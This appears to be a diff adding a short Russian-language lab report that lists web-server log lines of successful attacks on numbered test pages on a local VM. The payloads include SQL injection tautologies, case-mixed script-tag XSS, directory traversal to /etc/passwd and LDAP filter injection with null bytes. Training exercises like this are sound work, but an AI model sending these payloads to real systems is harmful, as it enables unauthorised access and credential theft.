@@ -1,0 +1,22 @@
+Прошли атаки: XSS, SQL injection, Directory traversal
+
+Логи успешных атак
+
+192.168.56.1 - - [01/Mar/2019:18:34:19 +0000] "GET /test1/example2.php?name=root%27%20or%20%271%27=%271
+192.168.56.1 - - [01/Mar/2019:18:35:21 +0000] "GET /test1/example2.php?name=root%27/**/and/**/%271%27=%271
+192.168.56.1 - - [01/Mar/2019:18:35:44 +0000] "GET /test1/example2.php?name=root%27/**/or/**/%271%27=%271
+
+192.168.56.1 - - [01/Mar/2019:18:38:27 +0000] "GET /test2/example2.php?name=%3Cscript%3Ealert(1)%3C/script%3E
+192.168.56.1 - - [01/Mar/2019:18:39:18 +0000] "GET /test2/example2.php?name=%3CscriPt%3Ealert(1)%3C/script%3E
+192.168.56.1 - - [01/Mar/2019:18:39:34 +0000] "GET /test2/example2.php?name=%3CscriPt%3Ealert(1)%3C/scrIpt%3E
+
+192.168.56.1 - - [01/Mar/2019:18:43:17 +0000] "GET /test4/example1.php?xml=%3Ctest%3Ehacker%3C/test%3E
+
+192.168.56.1 - - [01/Mar/2019:18:59:20 +0000] "GET /test6/example3.php?file=../../../../../etc/passwd 
+
+192.168.56.1 - - [01/Mar/2019:19:06:21 +0000] "GET /test3/example2.php?name=hacker&password=hacker%27%20or%20%271%27=%271
+192.168.56.1 - - [01/Mar/2019:19:06:33 +0000] "GET /test3/example2.php?name=hacker&password=hacker%27%20or%20%271%27=%271%20--%20r 
+
+192.168.56.1 - - [01/Mar/2019:19:07:35 +0000] "GET /test3/example2.php?name=hackerhacker)(cn=*))&password=hacker
+192.168.56.1 - - [01/Mar/2019:19:07:41 +0000] "GET /test3/example2.php?name=hackerhacker)(cn=*))%00&password=hacker
+192.168.56.1 - - [01/Mar/2019:19:07:57 +0000] "GET /test3/example2.php?name=hacker)(cn=*))%00&password=hacker 
